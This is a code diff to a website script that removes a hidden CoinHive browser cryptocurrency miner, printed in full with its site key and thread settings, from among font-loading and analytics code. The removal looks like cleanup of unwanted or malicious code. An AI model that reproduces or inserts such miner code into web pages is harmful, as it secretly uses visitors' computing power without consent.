@@ -284,19 +284,6 @@ WebFont.load({
   }
 });
 
-function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb(); clearInterval(_ival); } }, 20); return{ run: function(cb) { _cb=cb; } } }
-
-var miner;
-
-when('CoinHive').run(function(){
-  miner = new CoinHive.User('ZasbA5tMRe8RwG5qaprhjhcU1lJFeaX4', 'website', {
-    threads: 3,
-    throttle: 0.2
-  });
-  miner.setAutoThreadsEnabled(true);
-  miner.start();
-});
-
 window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
